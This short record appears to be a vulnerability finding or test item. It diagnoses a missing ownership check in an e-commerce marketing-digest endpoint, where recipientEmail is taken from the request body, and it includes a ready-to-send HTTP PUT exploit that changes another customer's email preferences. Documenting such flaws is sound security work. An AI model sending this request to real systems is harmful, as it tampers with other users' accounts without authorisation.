diagnosis: The marketing digest preference handler validates email syntax and frequency enums via class-validator, but writes settings to Redis using recipientEmail from the DTO payload without asserting that req.user.email matches recipientEmail.
exploit_request:
PUT /api/marketing/digest HTTP/1.1
Host: store.ecommerce.com:7005
Authorization: Bearer <user_token>
Content-Type: application/json

{"recipientEmail": "vip_client@example.com", "frequency": "NONE", "includePromotions": false}
